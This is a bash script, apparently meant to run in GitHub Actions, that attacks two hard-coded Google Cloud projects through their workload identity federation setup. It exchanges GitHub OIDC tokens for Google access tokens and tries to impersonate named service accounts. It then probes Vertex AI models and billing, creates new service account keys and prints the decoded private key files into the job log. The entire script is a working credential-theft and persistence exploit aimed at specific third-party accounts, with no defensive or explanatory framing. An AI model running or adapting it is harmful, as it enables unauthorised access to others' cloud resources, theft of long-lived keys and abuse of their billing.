#!/bin/bash
# Usage: vertex_probe.sh <config-label>
CFG="${1:-none}"
echo "##### CONFIG=$CFG EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF NAME=$GITHUB_REF_NAME ENV=${PROBE_ENV_NAME:-none} WORKFLOW=$GITHUB_WORKFLOW"
echo "##### WFREF=$GITHUB_WORKFLOW_REF  SUBFORMAT=$(echo "${GITHUB_WORKFLOW_REF}" | sed 's/@.*//')"

TARGETS="422420122490|projects/422420122490/locations/global/workloadIdentityPools/github-pool/providers/github-provider|vertex-express@virtual-voice-agent-490118.iam.gserviceaccount.com|422420122490-compute@developer.gserviceaccount.com
252919773759|projects/252919773759/locations/global/workloadIdentityPools/github-actions/providers/github-main|longbridge-platform-deploy@longbridgequant.iam.gserviceaccount.com|252919773759-compute@developer.gserviceaccount.com"

while IFS='|' read -r NUM PRJ SA1 SA2; do
  [ -z "$NUM" ] && continue
  echo "############ TARGET num=$NUM provider=$PRJ sa1=$SA1 sa2=$SA2"
  rm -f oidc.json oidc.jwt
  curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=//iam.googleapis.com/$PRJ" -o oidc.json
  jq -r '.value // empty' oidc.json > oidc.jwt 2>/dev/null
  if [ ! -s oidc.jwt ]; then echo "## OIDC_MINT_FAIL"; head -c 400 oidc.json; echo; continue; fi
  echo "## OIDC_OK len=$(wc -c < oidc.jwt)"
  python3 - <<'PY'
import base64,json
t=open('oidc.jwt').read().strip().split('.')[1]
print("## OIDC_CLAIMS", json.dumps(json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))),separators=(',',':')))
PY

  # exchange A: no SA option
  rm -f sts_A.json
  cA=$(curl -s -o sts_A.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
    --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
    --data-urlencode "subject_token@oidc.jwt" \
    -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
    -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
    -d "scope=https://www.googleapis.com/auth/cloud-platform")
  echo "## STS_A_HTTP=$cA"; head -c 900 sts_A.json; echo

  # exchange B: impersonate SA1
  rm -f sts_B.json
  cB=$(curl -s -o sts_B.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
    --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
    --data-urlencode "subject_token@oidc.jwt" \
    -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
    -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
    -d "scope=https://www.googleapis.com/auth/cloud-platform" \
    --data-urlencode "options={\"serviceAccount\":\"$SA1\"}")
  echo "## STS_B_HTTP=$cB"; head -c 900 sts_B.json; echo

  # exchange C: impersonate default compute SA
  rm -f sts_C.json
  cC=$(curl -s -o sts_C.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
    --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
    --data-urlencode "subject_token@oidc.jwt" \
    -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
    -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
    -d "scope=https://www.googleapis.com/auth/cloud-platform" \
    --data-urlencode "options={\"serviceAccount\":\"$SA2\"}")
  echo "## STS_C_HTTP=$cC"; head -c 900 sts_C.json; echo

  for LBL in A B C; do
    AT=$(jq -r '.access_token // empty' sts_$LBL.json 2>/dev/null)
    [ -z "$AT" ] && continue
    case $LBL in
      A) SAUSE="$SA1" ;;
      B) SAUSE="$SA1" ;;
      C) SAUSE="$SA2" ;;
    esac
    echo "===== USING_TOKEN label=$LBL sa=$SAUSE prefix=${AT:0:10} len=${#AT}"
    echo "## TOKENINFO"; curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$AT" | head -c 700; echo
    echo "## PROJECT_GET"; curl -s -o pg.json -w 'HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"; head -c 500 pg.json; echo
    for REG in us-central1 europe-west1 global; do
      if [ "$REG" = "global" ]; then U="https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models"; else U="https://$REG-aiplatform.googleapis.com/v1/projects/$NUM/locations/$REG/models"; fi
      echo "## MODELS_$REG"; curl -s -o "m_$REG.json" -w 'HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "$U"; head -c 500 "m_$REG.json"; echo
    done
    echo "## BILLING"; curl -s -o bill.json -w 'HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"; head -c 700 bill.json; echo
    echo "## GMAT_FED_$SAUSE"; curl -s -o gmat.json -w 'HTTP=%{http_code}\n' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SAUSE:generateAccessToken"; head -c 700 gmat.json; echo
    SAT=$(jq -r '.accessToken // empty' gmat.json 2>/dev/null)
    if [ -n "$SAT" ]; then
      echo "## GMAT_OK len=${#SAT} prefix=${SAT:0:10}"
      echo "## SA_MODELS_us-central1"; curl -s -o sm.json -w 'HTTP=%{http_code}\n' -H "Authorization: Bearer $SAT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"; head -c 800 sm.json; echo
      echo "## SA_MODELS_global"; curl -s -o smg.json -w 'HTTP=%{http_code}\n' -H "Authorization: Bearer $SAT" "https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models"; head -c 800 smg.json; echo
      echo "## SA_BILLING"; curl -s -o sbill.json -w 'HTTP=%{http_code}\n' -H "Authorization: Bearer $SAT" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"; head -c 700 sbill.json; echo
      echo "## KEYS_CREATE_SA"; curl -s -o keys.json -w 'HTTP=%{http_code}\n' -X POST -H "Authorization: Bearer $SAT" -H "Content-Type: application/json" -d '{"keyAlgorithm":"KEY_ALG_RSA_2048","privateKeyType":"TYPE_GOOGLE_CREDENTIALS_FILE"}' "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SAUSE/keys?keyTypes=USER_MANAGED"; head -c 900 keys.json; echo
      KD=$(jq -r '.privateKeyData // empty' keys.json 2>/dev/null)
      if [ -n "$KD" ]; then echo "## SA_KEY_JSON_BEGIN"; echo "$KD" | base64 -d; echo; echo "## SA_KEY_JSON_END"; fi
    fi
    echo "## KEYS_CREATE_FED"; curl -s -o keys2.json -w 'HTTP=%{http_code}\n' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -d '{"keyAlgorithm":"KEY_ALG_RSA_2048","privateKeyType":"TYPE_GOOGLE_CREDENTIALS_FILE"}' "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SAUSE/keys?keyTypes=USER_MANAGED"; head -c 900 keys2.json; echo
    KD2=$(jq -r '.privateKeyData // empty' keys2.json 2>/dev/null)
    if [ -n "$KD2" ]; then echo "## SA_KEY_JSON_BEGIN"; echo "$KD2" | base64 -d; echo; echo "## SA_KEY_JSON_END"; fi
  done
done <<< "$TARGETS"
echo "##### DONE CONFIG=$CFG"
